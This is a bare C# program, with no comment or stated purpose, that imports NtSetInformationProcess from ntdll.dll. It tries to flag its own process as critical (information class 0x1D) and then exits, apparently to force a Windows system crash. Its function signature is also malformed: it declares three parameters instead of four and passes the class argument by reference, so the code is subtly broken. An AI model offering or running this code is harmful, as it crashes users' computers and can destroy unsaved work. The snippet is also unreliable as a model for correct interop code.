using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
class a {
	[DllImport("ntdll.dll")]
	static extern int NtSetInformationProcess(IntPtr w, ref int x, int y);
	static void Main() {
		int l = 1;
		int k = 0x1D;
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, ref k, l);
		Environment.Exit(0);
	}
}